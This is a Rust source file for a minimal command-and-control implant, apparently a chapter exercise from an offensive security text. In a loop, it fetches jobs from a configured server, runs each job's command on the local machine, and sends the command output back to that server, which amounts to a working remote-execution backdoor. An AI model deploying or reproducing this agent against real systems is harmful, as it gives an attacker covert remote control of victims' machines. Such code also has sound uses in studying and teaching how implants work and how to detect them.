use common::api;
use std::{error::Error, process::Command, thread::sleep, time::Duration};

mod consts;

fn main() -> Result<(), Box<dyn Error>> {
    let api_client = ureq::AgentBuilder::new()
        .timeout(Duration::from_secs(10))
        .user_agent("ch_10_agent/0.1")
        .build();
    let sleep_for = Duration::from_secs(1);

    let get_job_route = format!("{}/api/agents/job", consts::SERVER_URL);
    let post_job_result_route = format!("{}/api/jobs/result", consts::SERVER_URL);

    loop {
        let api_res: api::Response<api::AgentJob> =
            api_client.get(get_job_route.as_str()).call()?.into_json()?;
        println!("{:?}", &api_res);

        match api_res.data {
            Some(job) => {
                let output = String::from_utf8(Command::new(job.command).output()?.stdout)?;

                let job_result = api::UpdateJobResult { id: job.id, output };
                let _ = api_client
                    .post(post_job_result_route.as_str())
                    .send_json(ureq::json!(job_result));
            }
            None => {
                log::debug!("No job found. Trying again in: {:?}", sleep_for);
                sleep(sleep_for);
                continue;
            }
        };
    }
}
